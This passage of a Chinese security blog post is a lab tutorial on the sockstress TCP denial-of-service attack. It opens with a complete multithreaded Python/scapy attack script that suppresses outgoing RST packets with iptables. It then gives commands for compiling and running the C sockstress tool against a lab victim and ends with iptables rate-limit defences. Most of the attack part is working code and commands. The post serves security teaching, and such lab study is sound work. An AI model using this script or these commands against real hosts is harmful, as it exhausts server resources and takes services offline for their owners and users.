signal</span><br><span class="line">import sys</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./sockstress.py [目标IP] [端口] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./sockstress.py 10.0.0.5 21 20 ## 请确定被攻击端口处于开放状态&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dstport = int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">## 攻击函数</span><br><span class="line">def sockstress(target,dstport):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        try:</span><br><span class="line">            x = random.randint(0,65535)</span><br><span class="line">            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags=&quot;S&quot;),timeout=1,verbose=0)</span><br><span class="line">            send(IP(dst=target)/TCP(sport=x,dport=dstport,window=0,flags=&quot;A&quot;,ack=(response[TCP].seq+1))/&apos;\x00\x00&apos;,verbose=0)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">## 停止攻击函数</span><br><span class="line">def shutdown(signal,frame):</span><br><span class="line">    print &quot;正在恢复iptables 规则&quot;</span><br><span class="line">    os.system(&apos;iptables -D OUTPUT -p tcp --tcp-flags RST RST -d&apos;+target+&apos; -j DROP&apos;)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">## 添加iptables规则</span><br><span class="line">os.system(&apos;iptables -A OUTPUT -p tcp --tcp-flags RST RST -d&apos;+target+&apos; -j DROP&apos;)</span><br><span class="line">signal.signal(signal.SIGINT,shutdown)</span><br><span class="line"></span><br><span class="line">## 多线程攻击</span><br><span class="line">print &quot;\n攻击正在进行...按 Ctrl+C 停止攻击&quot;</span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(sockstress,(target,dstport))</span><br><span class="line"></span><br><span class="line">## 永远执行</span><br><span class="line">while 0==0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>

<ul>
<li>Metasploit（被攻击者）<ul>
<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变</li>
<li><strong><code>🔺命令：netstat -pantu | grep ESTAB | wc -l</code></strong>（查看已经建立的连接数）</li>
<li><strong><code>🔺命令：Free -m</code></strong>（查看系统所用资源）</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ecf9kHo1arl_kZP61rNqhSJunjTth3MCHAa59FVQyZfJl_RpsW_Ym-SlfpGWCtf8I1vQfSxITqNiaWpLQLK_Eiaia2B9ayVj4sb7CILix1uDs6rSN87fVmVuNJCrlyeMWRMykM0zJqVR_XWZ4w&file_name=/sockstress%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E5%9B%BE.PNG" alt="服务器资源图"></p>
<h4 id="4-实验–C脚本"><a href="#4-实验–C脚本" class="headerlink" title="4. 实验–C脚本"></a>4. 实验–C脚本</h4><ul>
<li>Metasploit（被攻击者）<ul>
<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali（攻击者）<ul>
<li>防火墙规则：<strong><code>🔺命令：iptables -A OUTPUT -p TCP --tcp-flags rst rst -d Metasploit的IP -j DROP</code></strong></li>
<li>下载地址：<a href="https://github.com/defuse/sockstress" target="_blank" rel="noopener">https://github.com/defuse/sockstress</a> </li>
<li><strong><code>🔺命令：gcc -Wall -c sockstress.c</code></strong> </li>
<li><strong><code>🔺命令：gcc -pthread -o sockstress sockstress.o</code></strong> </li>
<li><strong><code>🔺命令：./sockstress Metasploit的IP:80 eth0</code></strong> </li>
<li><strong><code>🔺命令：./sockstress Metasploit的IP:80 eth0 -p payloads/http -d 10</code></strong></li>
</ul>
</li>
<li>Metasploit（被攻击者）<ul>
<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变</li>
<li><strong><code>🔺命令：netstat -pantu | grep ESTAB | wc -l</code></strong>（查看已经建立的连接数）</li>
<li><strong><code>🔺命令：free -m</code></strong>（查看系统所用资源）</li>
</ul>
</li>
</ul>
<h4 id="5-防御措施"><a href="#5-防御措施" class="headerlink" title="5. 防御措施"></a>5. 防御措施</h4><ul>
<li>直到今天sockstress攻击仍然是一种很有效的DoS攻击方式</li>
<li>由于建立完整的TCP三步握手，因此使用syn cookie防御无效（syn cookie对半步连接有效）</li>
<li>根本的防御方法是采用白名单（不实际）</li>
<li>折中对策：限制单位时间内每IP建的TCP连接数<ul>
<li>封杀每30秒与80端口建立连接10个的IP地址</li>
<li><strong><code>🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set</code></strong></li>
<li><strong><code>🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP</code></strong></li>
<li>以上规则对DDoS攻击无效</li>
</ul>
</li>
<li>▲ 可在Metasploit中加入iptables规则，Kali进行DoS尝试</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/4/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/6/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">137</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmail邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>Gmail邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">122.8k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
